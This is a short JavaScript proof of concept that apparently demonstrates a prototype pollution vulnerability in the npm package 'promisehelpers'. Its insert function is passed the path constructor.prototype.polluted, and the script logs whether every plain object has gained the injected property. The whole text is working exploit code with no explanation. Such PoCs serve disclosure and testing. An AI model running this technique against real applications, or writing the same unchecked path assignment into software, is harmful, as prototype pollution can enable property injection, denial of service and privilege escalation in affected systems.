var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const promisehelpers = require('promisehelpers');
obj = {};
console.log({}.polluted);
promisehelpers.insert([
    'constructor',
    'prototype',
    'polluted'
], 'yes')(obj);
console.log({}.polluted);